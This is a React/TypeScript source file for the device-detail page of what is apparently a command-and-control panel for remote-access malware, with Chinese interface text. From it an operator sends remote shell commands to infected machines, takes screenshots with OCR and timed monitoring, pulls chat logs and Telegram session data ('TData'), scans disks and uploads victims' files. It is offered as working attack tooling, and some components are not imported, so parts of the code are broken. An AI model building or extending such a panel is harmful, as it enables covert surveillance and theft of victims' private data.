import { PageContainer, ProCard } from '@ant-design/pro-components';
import { useParams, useRequest } from '@umijs/max';
import { Button, Card, Descriptions, message, Space, Tabs, Typography, Input, Table, Switch, Image, Badge, Alert, Select } from 'antd';
import React, { useEffect, useState } from 'react';
import { listC2DeviceVoByPageUsingPost, listSoftwareUsingGet, listWifiUsingGet } from '@/services/backend/c2DeviceController';
import { addC2TaskUsingPost, listC2TaskVoByPageUsingPost } from '@/services/backend/c2TaskController';
import { listScreenshotsUsingGet } from '@/services/backend/c2Controller';
import { ReloadOutlined, HistoryOutlined, PictureOutlined, PlayCircleOutlined, PauseCircleOutlined, CloudUploadOutlined, SearchOutlined } from '@ant-design/icons';

const { Paragraph } = Typography;

// --- Components ---

const SoftwareTab = ({ uuid, onRefresh }: { uuid: string; onRefresh: () => void }) => {
    const [softwareList, setSoftwareList] = useState<any[]>([]);
    const [loading, setLoading] = useState(false);

    const fetchData = async () => {
        if (!uuid) return;
        setLoading(true);
        console.log('SoftwareTab: Manual fetch start for uuid:', uuid);
        try {
            const res = await listSoftwareUsingGet({ deviceUuid: uuid });
            console.log('SoftwareTab: API Response:', res);
            
            let resultList: any[] = [];
            
            // Try to find the array in various locations
            const candidates = [
                res?.data?.data, // Axios -> BaseResponse -> List
                res?.data,       // BaseResponse -> List OR Axios -> List
                res              // List directly
            ];
            
            let found = false;
            for (const c of candidates) {
                if (Array.isArray(c)) {
                    console.log('SoftwareTab: Found array:', c);
                    resultList = c;
                    found = true;
                    break;
                }
            }
            
            if (!found) {
                console.warn('SoftwareTab: No array found in response', res);
            }
            
            setSoftwareList(resultList);
        } catch (e) {
            console.error('SoftwareTab: Fetch Error:', e);
            message.error('加载软件列表失败');
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        fetchData();
    }, [uuid]);

    const handleRefresh = () => {
        onRefresh();
        fetchData();
    };

    // Debug log to verify render
    console.log('SoftwareTab: Render with list length:', softwareList.length);

    return (
      <Space direction="vertical" style={{ width: '100%' }}>
        <Button icon={<ReloadOutlined />} onClick={handleRefresh}>刷新软件列表</Button>
        <Table
          loading={loading}
          dataSource={softwareList}
          columns={[
              { title: '软件名称', dataIndex: 'name', key: 'name' },
              { title: '版本', dataIndex: 'version', key: 'version' },
              { title: '安装日期', dataIndex: 'installDate', key: 'installDate', render: (val: any) => val || '-' }
          ]}
          pagination={{ pageSize: 10 }}
          rowKey={(record) => {
              if (record.id) return record.id;
              // Fallback for unique key if id is missing or duplicate
              return record.name + '_' + record.version + '_' + Math.random();
          }}
        />
      </Space>
    );
};

const WifiTab = ({ uuid, onRefresh }: { uuid: string; onRefresh: () => void }) => {
    const [wifiList, setWifiList] = useState<any[]>([]);
    const [loading, setLoading] = useState(false);

    const fetchData = async () => {
        if (!uuid) return;
        setLoading(true);
        try {
            const res = await listWifiUsingGet({ deviceUuid: uuid });
            let resultList: any[] = [];
            if (res?.data?.data && Array.isArray(res.data.data)) {
                resultList = res.data.data;
            } else if (res?.data && Array.isArray(res.data)) {
                resultList = res.data;
            }
            setWifiList(resultList);
        } catch (e) {
            console.error(e);
            message.error('获取WiFi列表失败');
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        fetchData();
    }, [uuid]);

    const handleRefresh = () => {
        onRefresh();
        fetchData();
    };

    const columns = [
        { title: 'SSID', dataIndex: 'ssid', key: 'ssid' },
        { title: 'BSSID (MAC)', dataIndex: 'bssid', key: 'bssid' },
        { title: '信号强度', dataIndex: 'signalStrength', key: 'signalStrength' },
        { title: '认证方式', dataIndex: 'authentication', key: 'authentication', render: (val: any) => val || '-' },
        { title: '采集时间', dataIndex: 'createTime', key: 'createTime' },
    ];

    return (
      <Space direction="vertical" style={{ width: '100%' }}>
        <Button icon={<ReloadOutlined />} onClick={handleRefresh}>扫描WiFi</Button>
        <Table
            loading={loading}
            dataSource={wifiList}
            columns={columns}
            pagination={{ pageSize: 10 }}
            rowKey={(record) => record.id || Math.random().toString()}
        />
      </Space>
    );
};


import { requestScanUsingPost, listFilesUsingGet } from '@/services/backend/c2FileController';

const FileTreeTab = ({ uuid, onSendCommand }: { uuid: string; onSendCommand: (cmd: string, params?: string) => void }) => {
    const [treeData, setTreeData] = useState<any[]>([]);
    const [expandedKeys, setExpandedKeys] = useState<React.Key[]>([]);
    const [loading, setLoading] = useState(false);
    const [loadedKeys, setLoadedKeys] = useState<React.Key[]>([]);

    const fetchFiles = async (parentPath: string = '') => {
        if (!uuid) return [];
        try {
            const res = await listFilesUsingGet({
                deviceUuid: uuid,
                parentPath: parentPath,
                current: 1,
                pageSize: 1000 // Get all files in directory
            });
            return res?.data?.data?.records || [];
        } catch (e) {
            console.error('Fetch files error:', e);
            return [];
        }
    };

    const onLoadData = async ({ key, children }: any) => {
        if (children && children.length > 0) return;
        
        const path = key as string;
        const files = await fetchFiles(path);
        
        if (files.length === 0) {
            // Trigger scan if empty
            message.info('目录为空或未缓存，下发扫描任务...');
            try {
                await requestScanUsingPost({
                    deviceUuid: uuid,
                    path: path
                });
                // Wait a bit or let user refresh manually?
                // User said "return if exists, else trigger scan".
                // Maybe show a temporary "Scanning..." node?
                return new Promise<void>(resolve => {
                    setTimeout(() => {
                         // We don't have real-time push, so we just resolve.
                         // User might need to collapse/expand or click refresh.
                         resolve();
                    }, 500);
                });
            } catch (e) {
                message.error('扫描任务下发失败');
            }
        }

        const nodes = files.map((file: any) => ({
            title: file.name,
            key: file.path,
            isLeaf: file.isDirectory !== 1,
            icon: file.isDirectory === 1 ? <FolderOpenOutlined /> : <FileOutlined />,
            data: file
        }));

        setTreeData(origin => updateTreeData(origin, key, nodes));
    };

    const updateTreeData = (list: any[], key: React.Key, children: any[]): any[] => {
        return list.map(node => {
            if (node.key === key) {
                return { ...node, children };
            }
            if (node.children) {
                return { ...node, children: updateTreeData(node.children, key, children) };
            }
            return node;
        });
    };

    // Initial load (Roots)
    useEffect(() => {
        const loadRoots = async () => {
            setLoading(true);
            const roots = await fetchFiles('');
            const nodes = roots.map((file: any) => ({
                title: file.name || file.path,
                key: file.path,
                isLeaf: file.isDirectory !== 1,
                icon: file.isDirectory === 1 ? <DesktopOutlined /> : <FileOutlined />,
                data: file
            }));
            setTreeData(nodes);
            setLoading(false);
        };
        loadRoots();
    }, [uuid]);

    const onSelect = (selectedKeys: React.Key[], info: any) => {
        console.log('selected', selectedKeys, info);
        const node = info.node;
        if (node.isLeaf) {
            // Show file actions
            Modal.confirm({
                title: '文件操作',
                content: `确定要上传文件 ${node.title} 吗？`,
                onOk: () => {
                    onSendCommand('upload_file', node.key);
                    message.success('上传任务已下发');
                }
            });
        }
    };

    return (
        <Space direction="vertical" style={{ width: '100%' }}>
            <Button icon={<ReloadOutlined />} onClick={() => setExpandedKeys([])}>重置/刷新</Button>
            {treeData.length === 0 ? (
                <div style={{ textAlign: 'center', padding: 20 }}>
                    <Button type="primary" onClick={() => onSendCommand('scan_disk', '')}>扫描磁盘驱动器</Button>
                </div>
            ) : (
                <Tree
                    showIcon
                    blockNode
                    treeData={treeData}
                    loadData={onLoadData}
                    onSelect={onSelect}
                    expandedKeys={expandedKeys}
                    onExpand={setExpandedKeys}
                    loadedKeys={loadedKeys}
                    onLoad={setLoadedKeys}
                    height={600}
                />
            )}
        </Space>
    );
};


const ScreenshotsTab = ({ uuid, autoRefresh }: { uuid: string; autoRefresh: boolean }) => {
    const [screenshots, setScreenshots] = useState<any[]>([]);
    const [loading, setLoading] = useState(false);
    const [searchText, setSearchText] = useState('');

    const fetchData = async () => {
        if (!uuid) return;
        setLoading(true);
        console.log('ScreenshotsTab: Fetching for', uuid, 'search:', searchText);
        try {
            const res = await listScreenshotsUsingGet({ uuid, searchText });
            console.log('ScreenshotsTab: API Response', res);
            
            let resultList: any[] = [];
            const candidates = [
                res?.data?.data, 
                res?.data,
                res
            ];
            
            for (const c of candidates) {
                if (Array.isArray(c)) {
                    resultList = c;
                    break;
                }
            }
            console.log('ScreenshotsTab: Parsed list', resultList);
            setScreenshots(resultList);
        } catch (e: any) {
            console.error('ScreenshotsTab error:', e);
            // Don't show error message on polling failure to avoid spam
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        fetchData();
        let interval: any;
        if (autoRefresh) {
            interval = setInterval(fetchData, 5000);
        }
        return () => {
            if (interval) clearInterval(interval);
        };
    }, [uuid, autoRefresh, searchText]);

    const handleScreenshot = async () => {
         try {
            await addC2TaskUsingPost({
                deviceUuid: uuid,
                command: 'screenshot',
                params: ''
            });
            message.success('截图指令已发送');
            // Refresh immediately
            setTimeout(fetchData, 1000);
         } catch (e: any) {
            message.error('发送失败: ' + e.message);
         }
    };

    const handleStartMonitor = async () => {
         try {
            await addC2TaskUsingPost({
                deviceUuid: uuid,
                command: 'start_monitor',
                params: '60000'
            });
            message.success('已开启定时截图');
         } catch (e: any) {
            message.error('发送失败: ' + e.message);
         }
    };

    const handleStopMonitor = async () => {
         try {
            await addC2TaskUsingPost({
                deviceUuid: uuid,
                command: 'stop_monitor',
                params: ''
            });
            message.success('已停止定时截图');
         } catch (e: any) {
            message.error('发送失败: ' + e.message);
         }
    };

    const handleDownloadAll = () => {
        if (!uuid) {
            message.error('设备UUID未知，无法打包下载');
            return;
        }
        window.open(`/api/c2/screenshots/download-all?uuid=${uuid}`, '_blank');
    };

    const columns = [
        {
            title: '缩略图',
            dataIndex: 'url',
            key: 'url',
            width: 150,
            render: (url: string) => (
                <Image
                    src={url}
                    height={80}
                    style={{ objectFit: 'cover', borderRadius: '4px' }}
                    fallback="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
                />
            )
        },
        { 
            title: 'OCR内容', 
            dataIndex: 'ocrResult', 
            key: 'ocrResult',
            width: 300,
            render: (text: string) => (
                <Paragraph ellipsis={{ rows: 3, expandable: true, symbol: '展开' }}>
                    {text || '-'}
                </Paragraph>
            )
        },
        { title: '创建时间', dataIndex: 'createTime', key: 'createTime', width: 180 },
        { 
            title: '操作', 
            key: 'action',
            render: (_: any, record: any) => (
                <a href={record.url} target="_blank" rel="noreferrer">查看原图</a>
            )
        }
    ];

    return (
        <Space direction="vertical" style={{ width: '100%' }}>
            <Space>
                <Button icon={<PictureOutlined />} onClick={handleScreenshot}>获取新截图</Button>
                <Button icon={<ReloadOutlined />} onClick={fetchData} loading={loading}>刷新列表</Button>
                <Button icon={<PlayCircleOutlined />} onClick={handleStartMonitor}>开启定时截图 (60s)</Button>
                <Button icon={<PauseCircleOutlined />} onClick={handleStopMonitor} danger>停止定时截图</Button>
                <Button type="primary" onClick={handleDownloadAll}>一键打包下载所有图片</Button>
            </Space>
            <Space>
                <Input.Search 
                    placeholder="搜索OCR识别内容..." 
                    allowClear
                    enterButton="搜索"
                    size="middle"
                    onSearch={(value) => setSearchText(value)}
                    style={{ width: 400 }}
                />
            </Space>
            <Table
                dataSource={screenshots}
                columns={columns}
                rowKey={(record) => record.id || Math.random().toString()}
                pagination={{ pageSize: 10 }}
            />
        </Space>
    );
};

const DownloadsTab = ({ uuid, autoRefresh }: { uuid: string; autoRefresh: boolean }) => {
    const { data: uploads, loading } = useRequest(async (params = { current: 1, pageSize: 20 }) => {
        const res = await listC2TaskVoByPageUsingPost({
            deviceUuid: uuid,
            command: 'upload_file',
            sortField: 'createTime',
            sortOrder: 'descend',
            current: params.current,
            pageSize: params.pageSize
        });
        return {
             list: res?.data?.data?.records || [],
             total: res?.data?.data?.total || 0
        };
    }, { 
        pollingInterval: autoRefresh ? 5000 : 0, 
        refreshDeps: [uuid],
        paginated: true
    });
    
    const columns = [
      { title: '文件名', dataIndex: 'result', key: 'result' },
      { title: '状态', dataIndex: 'status', key: 'status', render: (status: string) => <Badge status={status === 'completed' ? 'success' : 'processing'} text={status} /> },
      { title: '时间', dataIndex: 'updateTime', key: 'updateTime' },
      {
        title: '操作',
        key: 'action',
        render: (_: any, record: any) => (
            record.status === 'completed' ? 
            <a href={`/api/c2/download?uuid=${uuid}&filename=${record.result}`} target="_blank" rel="noreferrer">下载文件</a>
            : '-'
        )
      }
    ];

    return (
        <Table
          loading={loading}
          dataSource={uploads?.list}
          columns={columns}
          pagination={{
              ...uploads?.pagination,
              showSizeChanger: true,
              showTotal: (total) => `共 ${total} 条`,
          }}
          rowKey="id"
        />
    );
};

const C2DeviceDetail: React.FC = () => {
  const { id: uuid } = useParams<{ id: string }>();
  const [activeTab, setActiveTab] = useState('software');
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [customCommand, setCustomCommand] = useState<string>('');
  const [customParams, setCustomParams] = useState<string>('');

  const { data: device, loading, refresh } = useRequest(() => listC2DeviceVoByPageUsingPost({
    uuid: uuid,
    pageSize: 1,
  }), {
    pollingInterval: autoRefresh ? 3000 : undefined,
    formatResult: (res) => {
        const data = res?.data;
        if (data?.records) return data.records[0];
        if (data?.data?.records) return data.data.records[0];
        return null;
    }
  });

  // Send Command Helper
  const sendCommand = async (command: string, params: string = '') => {
    if (!uuid) return;
    const hide = message.loading(`正在下发 ${command} 命令...`);
    try {
      await addC2TaskUsingPost({
        deviceUuid: uuid,
        command,
        params,
      });
      hide();
      message.success(`${command} 命令已下发`);
      return true;
    } catch (error: any) {
      hide();
      message.error(`下发失败: ${error.message}`);
      return false;
    }
  };

  return (
    <PageContainer 
        title={`设备详情: ${device?.hostName || '未知'}`}
        extra={<Space><span>自动刷新</span><Switch checked={autoRefresh} onChange={setAutoRefresh} /></Space>}
    >
      <ProCard>
        <Descriptions title="基本信息" column={2}>
          <Descriptions.Item label="UUID">{device?.uuid}</Descriptions.Item>
          <Descriptions.Item label="主机名">{device?.hostName}</Descriptions.Item>
          <Descriptions.Item label="操作系统">{device?.os}</Descriptions.Item>
          <Descriptions.Item label="IP地址">{device?.externalIp} / {device?.internalIp}</Descriptions.Item>
          <Descriptions.Item label="MAC地址">{device?.macAddress}</Descriptions.Item>
          <Descriptions.Item label="最后在线">{device?.lastSeen}</Descriptions.Item>
        </Descriptions>
      </ProCard>

      <Card style={{ marginTop: 20 }} title="快速指令控制台">
        <Space>
             <Select 
                style={{ width: 220 }} 
                placeholder="选择命令"
                onChange={(val) => setCustomCommand(val)}
                options={[
                    { label: '执行CMD (cmd_exec)', value: 'cmd_exec' },
                    { label: '屏幕截图 (screenshot)', value: 'screenshot' },
                    { label: '开启监控 (start_monitor)', value: 'start_monitor' },
                    { label: '停止监控 (stop_monitor)', value: 'stop_monitor' },
                    { label: '获取软件 (get_software)', value: 'get_software' },
                    { label: '获取WiFi (get_wifi)', value: 'get_wifi' },
                    { label: '聊天记录 (get_chat_logs)', value: 'get_chat_logs' },
                    { label: '全盘扫描 (scan_disk)', value: 'scan_disk' },
                    { label: '最近文件 (scan_recent)', value: 'scan_recent' },
                    { label: '设置心跳 (set_heartbeat)', value: 'set_heartbeat' },
                    { label: '上传TData (upload_db)', value: 'upload_db' },
                ]}
             />
             <Input 
                style={{ width: 300 }} 
                placeholder="参数 (如 whoami 或 60000)" 
                value={customParams}
                onChange={e => setCustomParams(e.target.value)}
             />
             <Button type="primary" onClick={() => sendCommand(customCommand, customParams)}>发送指令</Button>
        </Space>
      </Card>
      
      <Card style={{ marginTop: 20 }}>
        <Tabs
          activeKey={activeTab}
          onChange={setActiveTab}
          items={[
            { 
                label: '软件列表', 
                key: 'software', 
                children: <SoftwareTab uuid={uuid || ''} onRefresh={() => sendCommand('get_software')} /> 
            },
            { 
                label: 'WiFi信息', 
                key: 'wifi', 
                children: <WifiTab uuid={uuid || ''} onRefresh={() => sendCommand('get_wifi')} /> 
            },
            { 
                label: '文件管理', 
                key: 'files', 
                children: <FileTreeTab uuid={uuid || ''} onSendCommand={sendCommand} /> 
            },
            {
                label: '截图记录',
                key: 'screenshots',
                children: <ScreenshotsTab uuid={uuid || ''} autoRefresh={autoRefresh} />
            },
            { 
                label: '下载记录', 
                key: 'downloads', 
                children: <DownloadsTab uuid={uuid || ''} autoRefresh={autoRefresh} /> 
            },
          ]}
        />
      </Card>
    </PageContainer>
  );
};

export default C2DeviceDetail;
